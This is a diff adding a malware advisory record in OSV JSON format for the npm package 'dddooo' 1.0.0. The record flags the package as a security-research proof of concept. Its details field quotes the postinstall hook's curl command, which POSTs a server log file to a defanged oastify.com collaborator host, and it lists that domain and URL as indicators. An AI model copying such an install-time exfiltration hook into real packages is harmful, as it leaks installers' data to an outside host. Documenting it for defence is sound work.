@@ -1,0 +1,59 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5967",
+  "aliases": [
+    "MAL-2026-6460"
+  ],
+  "modified": "2026-06-25T09:59:17Z",
+  "published": "2026-06-25T09:58:46Z",
+  "summary": "Security-research / proof-of-concept package: dddooo (npm)",
+  "details": "The package \"dddooo\" 1.0.0 contains a postinstall lifecycle hook that exfiltrates server log data via HTTP. On install, the hook executes: curl -X POST -d \"$(cat /data/logs/monitor-2026-06-16.log)\" hxxp://3dhd6wwmusbh04m22igmzvb4hvnmblza[.]oastify[.]com/data — reading the file /data/logs/monitor-2026-06-16.log (likely an Nginx, Apache, or application access log) and POSTing its contents to the external host 3dhd6wwmusbh04m22igmzvb4hvnmblza[.]oastify[.]com (an interactsh/Burp Collaborator-style intercept service). The published module code (index.js) is a benign-looking string utility library with no malicious logic visible at runtime; all malicious behaviour runs during the install lifecycle phase via the shell hook. No repository URL, no homepage, and the package name is a meaningless string with no relation to any well-known library.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "dddooo",
+        "purl": "pkg:npm/dddooo@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/dddooo/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5967"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "research_poc",
+      "first_seen_at": "2026-06-25T09:58:46Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "3dhd6wwmusbh04m22igmzvb4hvnmblza[.]oastify[.]com"
+        ],
+        "url_observed": [
+          "hxxp://3dhd6wwmusbh04m22igmzvb4hvnmblza[.]oastify[.]com/data"
+        ]
+      }
+    }
+  }
+}
